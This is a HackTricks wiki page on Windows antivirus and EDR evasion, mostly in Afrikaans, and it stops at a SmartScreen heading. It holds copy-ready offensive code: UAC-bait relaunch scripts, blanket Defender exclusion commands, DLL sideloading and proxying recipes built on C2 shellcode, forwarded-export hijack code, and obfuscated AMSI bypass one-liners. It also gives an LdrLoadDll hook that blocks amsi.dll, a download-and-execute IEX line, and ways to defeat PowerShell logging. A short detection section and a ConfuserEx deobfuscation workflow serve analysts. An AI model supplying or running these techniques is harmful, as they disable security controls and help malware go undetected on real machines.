# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is aanvanklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n Tool om Windows Defender te laat ophou werk.
- [no-defender](https://github.com/es3n1n/no-defender): 'n Tool om Windows Defender te laat ophou werk deur voor te gee dit is 'n ander AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders wat as game cheats vermom is, word gereeld as unsigned Node.js/Nexe installers versprei wat eers **die user vra vir elevation** en eers daarna Defender neutraliseer. Die flow is eenvoudig:

1. Toets vir administrative context met `net session`. Die command slaag slegs wanneer die caller admin rights het, so 'n failure dui daarop dat die loader as 'n standard user loop.
2. Herbegin homself onmiddellik met die `RunAs` verb om die verwagte UAC consent prompt te trigger terwyl die oorspronklike command line behou word.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Slagoffers glo reeds dat hulle “cracked” sagteware installeer, so die prompt word gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.

### Blanket `MpPreference` exclusions for every drive letter

Sodra verhoog, maksimeer GachiLoader-styl kettings Defender blindekolle eerder as om die diens heeltemal af te skakel. Die loader maak eers die GUI watchdog dood (`taskkill /F /IM SecHealthUI.exe`) en druk dan **uiters breë uitsluitings** uit sodat elke gebruikerprofiel, stelseldirektorie en verwyderbare skyf onskandeerbaar word:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Sleutelwaarnemings:

- Die lus loop deur elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.) so **enige toekomstige payload wat enige plek op skyf laat val word, word geïgnoreer**.
- Die `.sys`-uitbreiding-uitsluiting is vorentoe-gerig—aanvallers behou die opsie om later ongetekende drivers te laai sonder om Defender weer aan te raak.
- Alle veranderinge beland onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, wat latere fases toelaat om te bevestig dat die uitsluitings voortduur of om dit uit te brei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, rapporteer naïewe gesondheidskontroles steeds “antivirus active” al raak regte-tyd-inspeksie nooit daardie paaie nie.

## **AV Evasion Methodology**

Tans gebruik AVs verskillende metodes om te kyk of ’n lêer kwaadwillig is of nie, static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende kwaadwillige strings of arrays van bytes in ’n binary of script te vlag, en ook inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende public tools jou makliker kan laat vastrap, aangesien hulle waarskynlik reeds ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort detection te omseil:

- **Encryption**

As jy die binary encrypt, sal daar geen manier wees vir AV om jou program te detect nie, maar jy sal wel ’n soort loader nodig hê om die program in memory te decrypt en uit te voer.

- **Obfuscation**

Soms is alles wat jy hoef te doen om net ’n paar strings in jou binary of script te verander om dit by AV verby te kry, maar dit kan ’n tydrowende taak wees afhangend van wat jy probeer obfuscate.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit vat baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender static detection te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel basies die lêer in verskeie segmente en laat dan Defender elkeen afsonderlik scan, so kan dit vir jou presies sê watter strings of bytes in jou binary gevlag word.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion kyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in ’n sandbox laat loop en vir kwaadwillige aktiwiteit dophou (bv. probeer om jou browser se passwords te decrypt en lees, ’n minidump op LSASS uitvoer, ens.). Hierdie deel kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te omseil.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dynamic analysis te bypass. AVs het ’n baie kort tyd om lêers te scan om nie die gebruiker se workflow te onderbreek nie, so om lang sleeps te gebruik kan die analyse van binaries ontwrig. Die probleem is dat baie AV sandboxes eenvoudig die sleep kan oorslaan afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Gewoonlik het Sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders kan dit die gebruiker se masjien vertraag. Jy kan ook hier baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaier-snelhede te check, nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy ’n gebruiker wil teiken wie se workstation by die "contoso.local" domain aangesluit is, kan jy ’n check op die rekenaar se domain doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het; as dit nie ooreenstem nie, kan jy jou program laat exit.

Dit blyk dat Microsoft Defender se Sandbox-rekenaarnaam HAL9TH is, so jy kan die rekenaarnaam in jou malware check voor detonatie; as die naam HAL9TH is, beteken dit jy is binne defender se sandbox, so jy kan jou program laat exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie tips van [@mgeeky](https://twitter.com/mariuszbit) om teen Sandboxes te werk

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons vroeër in hierdie post gesê het, sal **public tools** uiteindelik **gedetect word**, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander project gebruik wat minder bekend is en ook LSASS dump.

Die regte antwoord is waarskynlik laasgenoemde. As jy mimikatz as voorbeeld neem, is dit waarskynlik een van, indien nie die mees gevlagde stuk malware deur AVs en EDRs nie; terwyl die project self super cool is, is dit ook ’n nagmerrie om daarmee te werk om AVs te omseil, so soek net alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir evasion verander, maak seker dat jy **automatic sample submission** in defender afskakel, en asseblief, ernstig, **MOENIE NA VIRUSTOTAL OPLAAD** as jou doel is om op die lang termyn evasion te bereik. As jy wil check of jou payload deur ’n spesifieke AV gedetect word, installeer dit op ’n VM, probeer om die automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar dit ook al moontlik is, prioritiseer altyd **die gebruik van DLLs vir evasion**, volgens my ervaring word DLL-lêers gewoonlik **baie minder gedetect en geanaliseer**, so dit is ’n baie eenvoudige truuk om te gebruik om in sommige gevalle detection te vermy (as jou payload natuurlik ’n manier het om as ’n DLL te loop).

Soos ons in hierdie beeld kan sien, het ’n DLL Payload van Havoc ’n detection rate van 4/26 in antiscan.me, terwyl die EXE payload ’n 7/26 detection rate het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nou gaan ons ’n paar truuks wys wat jy met DLL-lêers kan gebruik om baie meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL search order wat deur die loader gebruik word deur beide die victim application en malicious payload(s) langs mekaar te plaas.

Jy kan kyk vir programme wat vatbaar is vir DLL Sideloading met behulp van [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie command sal die lys van programs uitset wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL files wat hulle probeer laai.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable programs self verken**, hierdie technique is redelik stealthy as dit reg gedoen word, maar as jy publiek bekende DLL Sideloadable programs gebruik, kan jy maklik gevang word.

Net deur ’n malicious DLL met die naam wat ’n program verwag om te laai te plaas, sal nie jou payload laai nie, aangesien die program sekere spesifieke functions binne daardie DLL verwag; om hierdie issue reg te stel, sal ons ’n ander technique gebruik genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** forward die calls wat ’n program maak van die proxy (en malicious) DLL na die original DLL, en behou dus die program se functionality en die vermoë om die execution van jou payload te hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project van [@flangvik](https://twitter.com/Flangvik/) gebruik

Dit is die steps wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal vir ons 2 lêers gee: ’n DLL-bronkode-sjabloon, en die oorspronklik hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Dit is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het ’n 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, en ook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons in meer diepte bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE modules kan funksies uitvoer wat eintlik "forwarders" is: in plaas daarvan om na code te wys, bevat die export entry ’n ASCII string in die vorm `TargetDll.TargetFunc`. Wanneer ’n caller die export resolve, sal die Windows loader:

- `TargetDll` laai as dit nog nie reeds gelaai is nie
- `TargetFunc` daaruit resolve

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit uit die beskermde KnownDLLs namespace verskaf (bv. ntdll, kernelbase, ole32).
- As `TargetDll` nie ’n KnownDLL is nie, word die normale DLL search order gebruik, wat die directory van die module insluit wat die forward resolution doen.

Dit maak ’n indirekte sideloading primitive moontlik: vind ’n signed DLL wat ’n funksie uitvoer wat na ’n nie-KnownDLL module name geforward word, en plaas dan daardie signed DLL saam met ’n aanvaller-beheerde DLL wat presies dieselfde naam as die forwarded target module het. Wanneer die forwarded export opgeroep word, resolve die loader die forward en laai jou DLL uit dieselfde directory, wat jou DllMain uitvoer.

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie `n` KnownDLL nie, so dit word via die normale soekvolgorde opgelos.

PoC (copy-paste):
1) Kopieer die ondertekende stelsel-DLL na `n skryfbare vouer
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. 'n Minimum DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die deurverwysde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Sneller die forward met ’n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (ondertekend) laai die side-by-side `keyiso.dll` (ondertekend)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, sal jy eers ná `DllMain` reeds geloop het ’n "missing API" fout kry

Jag wenke:
- Fokus op forwarded exports waar die teiken module nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports enumereer met tooling soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder inventory om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Detection/defense idees:
- Monitor LOLBins (bv. rundll32.exe) wat signed DLLs vanaf non-system paths laai, gevolg deur die laai van non-KnownDLLs met dieselfde base name vanaf daardie directory
- Alert op process/module chains soos: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` onder user-writable paths
- Enforce code integrity policies (WDAC/AppLocker) en deny write+execute in application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op ’n stealthy manier te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is net ’n kat-en-muis-speletjie, wat vandag werk, kan môre opgespoor word, so vertrou nooit op net een tool nie; indien moontlik, probeer om meerdere evasion techniques te ketting.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs plaas dikwels **user-mode inline hooks** op `ntdll.dll` syscall stubs. Om daardie hooks te omseil, kan jy **direkte** of **indirekte** syscall stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel mode oorskakel sonder om die gehookte export entrypoint uit te voer.

**Invocation options:**
- **Direct (embedded)**: emit `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te keer. Aanvanklik kon AVs slegs **lêers op skyf** skandeer, so as jy op een of ander manier payloads **direk in memory** kon uitvoer, kon die AV niks doen om dit te keer nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in hierdie komponente van Windows.

- User Account Control, of UAC (elevation van EXE, COM, MSI, of ActiveX installation)
- PowerShell (scripts, interaktiewe gebruik, en dinamiese code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript en VBScript
- Office VBA macros

Dit laat antivirus-oplossings toe om script-gedrag te inspekteer deur script-inhoud bloot te stel in ’n vorm wat beide on-encrypted en unobfuscated is.

Die uitvoer van `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende alert op Windows Defender genereer.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` vooraan voeg en dan die path na die executable waaruit die script geloop het, in hierdie geval, powershell.exe

Ons het geen file na disk laat val nie, maar is steeds in-memory gevang weens AMSI.

Verder, vanaf **.NET 4.8**, word C# code ook deur AMSI uitgevoer. Dit beïnvloed selfs `Assembly.Load(byte[])` om in-memory execution te laai. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of laer) aanbeveel vir in-memory execution as jy AMSI wil evade.

Daar is ’n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met static detections werk, kan die aanpassing van die scripts wat jy probeer laai ’n goeie manier wees om detection te evade.

AMSI het egter die vermoë om scripts te unobfuscate, selfs al het hulle verskeie layers, so obfuscation kan ’n slegte opsie wees, afhangend van hoe dit gedoen word. Dit maak evasie nie heeltemal straightforward nie. Soms is al wat jy moet doen egter om ’n paar variable names te verander en dan is jy reg, so dit hang af van hoe baie iets geflag is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer is deur ’n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) process te load, is dit maklik moontlik om daarmee te tamper, selfs wanneer jy as ’n unprivileged user loop. As gevolg van hierdie flaw in die implementation van AMSI, het researchers verskeie maniere gevind om AMSI scanning te evade.

**Forcing an Error**

Om die AMSI initialisation te laat fail (amsiInitFailed) sal daartoe lei dat geen scan vir die huidige process geïnisieer sal word nie. Oorspronklik is dit deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak en Microsoft het ’n signature ontwikkel om wyer usage te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dit het net een reël powershell-kode gekos om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self geflag, so ’n paar wysigings is nodig om hierdie tegniek te gebruik.

Hier is ’n gewysigde AMSI bypass wat ek geneem het van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Onthou, dat dit waarskynlik gemerk sal word sodra hierdie pos uitkom, so jy moet geen kode publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/_RastaMouse/) en dit behels die vind van die adres vir die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker-verskafde invoer) en om dit te oorskryf met instruksies om die kode vir E_INVALIDARG terug te gee, op hierdie manier sal die resultaat van die werklike scan 0 teruggee, wat geïnterpreteer word as 'n skoon resultaat.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil, kyk na [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer oor hulle te leer.

### Blokkeer AMSI deur te verhoed dat amsi.dll laai (LdrLoadDll hook)

AMSI word slegs geïnitialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal-agnostiese omseiling is om 'n user-mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. As gevolg hiervan laai AMSI nooit en geen scans vind vir daardie proses plaas nie.

Implementasie-oorsig (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Werk oor PowerShell, WScript/CScript en custom loaders ewe goed (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die invoer van scripts oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang command-line artefakte te vermy.
- Word gesien in loaders wat deur LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` oproep).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is ’n funksie wat jou toelaat om alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, te log. Dit kan nuttig wees vir ouditering en foutopsporing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil ontduik**.

Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:

- **Deaktiveer PowerShell Transcription en Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) vir hierdie doel gebruik.
- **Gebruik Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, so jy kan jou scripts laat loop sonder om deur AMSI geskandeer te word. Jy kan dit doen: `powershell.exe -version 2`
- **Gebruik ’n Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om ’n powershell te laat spawn sonder defenses (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke steun op die enkripsie van data, wat die entropy van die binary sal verhoog en dit makliker sal maak vir AVs en EDRs om dit te detect. Wees versigtig hiermee en pas dalk net enkripsie toe op spesifieke dele van jou code wat sensitief is of versteek moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware analiseer wat ConfuserEx 2 (of commercial forks) gebruik, is dit algemeen om verskeie lae van protection teë te kom wat decompilers en sandboxes sal blokkeer. Die workflow hieronder herstel betroubaar **’n byna-oorspronklike IL** wat daarna na C# gedecompileer kan word in tools soos dnSpy of ILSpy.

1. Anti-tampering removal – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die *module* static constructor (`<Module>.cctor`). Dit patche ook die PE checksum sodat enige modification die binary sal laat crash. Gebruik **AntiTamperKiller** om die encrypted metadata tables op te spoor, die XOR keys te recover en ’n skoon assembly te rewrite:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2. Symbol / control-flow recovery – feed die *clean* file to **de4dot-cex** (’n ConfuserEx-aware fork van de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecteer die ConfuserEx 2 profile
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, classes en variable names herstel en konstante strings dekripteer.

3. Proxy-call stripping – ConfuserEx vervang direkte method calls met liggewig wrappers (ook bekend as *proxy calls*) om decompilation verder te breek. Verwyder hulle met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper functions (`Class8.smethod_10`, …).

4. Manual clean-up – run die resulting binary onder dnSpy, search vir groot Base64 blobs of `RijndaelManaged`/`TripleDESCryptoServiceProvider` gebruik om die *real* payload te locate. Dikwels stoor die malware dit as ’n TLV-encoded byte array wat binne `<Module>.byte_0` geïnitialiseer word.

Die bostaande chain herstel execution flow **sonder** om die malicious sample te laat loop – nuttig wanneer jy op ’n offline workstation werk.

> 🛈 ConfuserEx produseer ’n custom attribute genaamd `ConfusedByAttribute` wat as ’n IOC gebruik kan word om samples outomaties te triage.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n oopbron-fork van die [LLVM](http://www.llvm.org/) samestellingsuite te voorsien wat verhoogde sagtewaresekuriteit kan bied deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om `C++11/14`-taal te gebruik om, tydens kompileer, geobfuskeerde kode te genereer sonder om enige eksterne tool te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag geobfuskeerde operasies by wat deur die C++ template metaprogramming framework gegenereer word, wat die lewe vir die persoon wat die application wil crack ’n bietjie moeiliker maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64 binary obfuscator wat in staat is om verskeie verskillende pe files te obfuscate, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorphic code engine vir arbitrêre executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige code obfuscation framework vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscate ’n program op die assembly code-vlak deur gewone instruksies in ROP chains te transformeer, wat ons natuurlike opvatting van normale control flow verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL na shellcode omskakel en dit dan laai

## SmartScreen & MoTW

Jy het moontlik hierdie skerm gesien wanneer jy sekere executables van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van potensieel kwaadwillige applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

